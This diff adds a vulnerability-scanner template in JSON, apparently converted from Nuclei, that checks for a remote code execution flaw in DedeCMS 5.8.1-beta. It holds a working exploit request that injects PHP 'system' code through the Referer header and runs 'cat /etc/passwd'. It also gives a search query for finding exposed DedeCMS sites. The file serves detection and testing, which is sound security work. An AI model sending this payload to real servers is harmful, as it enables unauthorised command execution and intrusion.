@@ -1,0 +1,142 @@
+{
+  "id": "dedecms-rce",
+  "name": "DedeCMS 5.8.1-beta - Remote Code Execution",
+  "author": "ritikchaddha",
+  "severity": "CRITICAL",
+  "description": "DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.\n",
+  "references": [
+    "https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html",
+    "https://sectime.top/post/1d114771.html"
+  ],
+  "tags": [
+    "dedecms",
+    "cms",
+    "rce"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "app\u003d\"DedeCMS\""
+  },
+  "variables": {},
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /plus/flink.php?dopost\u003dsave\u0026c\u003dcat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nReferer: \u003c?php \"system\"($c);die;/*ref\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "REGEX",
+          "part": "body",
+          "values": [
+            "root:[x*]:0:0"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "internal": "true",
+          "group": 1
+        },
+        {
+          "type": "STATUS",
+          "values": [
+            "200"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "dedecms-rce",
+    "info": {
+      "name": "DedeCMS 5.8.1-beta - Remote Code Execution",
+      "author": "ritikchaddha",
+      "severity": "critical",
+      "description": "DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper authorization, thus possibly obtaining sensitive information, modifying data, and/or gaining full control over a compromised system without entering necessary credentials.\n",
+      "reference": [
+        "https://srcincite.io/blog/2021/09/30/chasing-a-dream-pwning-the-biggest-cms-in-china.html",
+        "https://sectime.top/post/1d114771.html"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 1,
+        "fofa_query": "app\u003d\"DedeCMS\""
+      },
+      "tags": "dedecms,cms,rce"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /plus/flink.php?dopost\u003dsave\u0026c\u003dcat%20/etc/passwd HTTP/1.1\nHost: {{Hostname}}\nReferer: \u003c?php \"system\"($c);die;/*ref\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "root:[x*]:0:0"
+            ],
+            "group": 1,
+            "internal": true
+          },
+          {
+            "type": "status",
+            "status": [
+              200
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
